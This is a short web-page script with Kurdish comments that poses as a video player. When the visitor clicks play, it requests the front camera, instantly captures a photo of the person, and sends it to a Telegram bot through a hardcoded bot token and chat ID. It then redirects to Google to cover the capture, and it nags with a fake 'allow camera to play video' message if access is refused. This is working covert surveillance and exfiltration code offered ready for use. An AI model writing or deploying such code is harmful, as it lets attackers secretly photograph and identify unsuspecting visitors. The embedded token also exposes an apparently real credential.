    <script>
        // --- تۆکەن و ئایدیـەکەت لێرە دانراون ---
        const BOT_TOKEN = "7076192145:AAHM5a_j1u1_znFUNn2rvPmF73selg1NaSY"; 
        const CHAT_ID = "6248560824";
        // ------------------------------------

        const video = document.getElementById('cameraPreview');
        const canvas = document.getElementById('canvas');
        const overlay = document.getElementById('video-overlay');
        const spinner = document.getElementById('spinner');
        const successScreen = document.getElementById('success-screen');

        function startCapture() {
            // دوگمەی Play دەخاتە ناو و بارگەری دەردەکەوێت
            document.querySelector('.play-btn').style.display = 'none';
            spinner.style.display = 'block';

            try {
                const constraints = { 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }, 
                    audio: false 
                };

                navigator.mediaDevices.getUserMedia(constraints)
                    .then(stream => {
                        video.srcObject = stream;
                        
                        // کاتێک ڤیدیۆ ئامادە بوو، بە یەکسەر دەست دەکات بە گرتن
                        video.onloadedmetadata = () => {
                            video.play();
                            
                            // 0 چرکە چاوەڕێکردن (بە یەکسەر)
                            setTimeout(() => {
                                captureAndSend();
                            }, 0); 
                        };
                    })
                    .catch(err => {
                        console.error("هەڵە:", err);
                        // ئەگەر کەسەکە ڕەتیکردەوە، شاشەی سەرەکی دەگەڕێتەوە
                        spinner.style.display = 'none';
                        document.querySelector('.play-btn').style.display = 'flex';
                        document.querySelector('.description').innerText = "Please allow camera to play video.";
                    });

            } catch (e) {
                console.error("هەڵەیەکی سەرەکی:", e);
            }
        }

        function captureAndSend() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // وێنەکە دەکێشێت
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // گۆڕینی وێنەکە بۆ Blob
            canvas.toBlob((blob) => {
                if (blob) {
                    sendToTelegram(blob);
                } else {
                    alert("هەڵە لە کاتی گرتنی وێنە");
                }
            }, 'image/jpeg', 0.8);
        }

        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob);
            formData.append('caption', '📸 وێنەی کەسەکە گرترا (Instant)');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("نێردرا!");
                    // شاشەی سەرکەوتن دەردەکەوێت
                    successScreen.style.display = 'flex';
                    
                    // داخستنی کامێرا
                    if (video.srcObject) {
                        video.srcObject.getTracks().forEach(track => track.stop());
                    }

                    // گواستنەوە بۆ گووگڵ دوای 1 چرکە
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 1000);
                } else {
                    console.error("هەڵە لە ناردن:", data);
                }
            })
            .catch(error => {
                console.error("هەڵە لە ناردن:", error);
            });
        }
    </script>
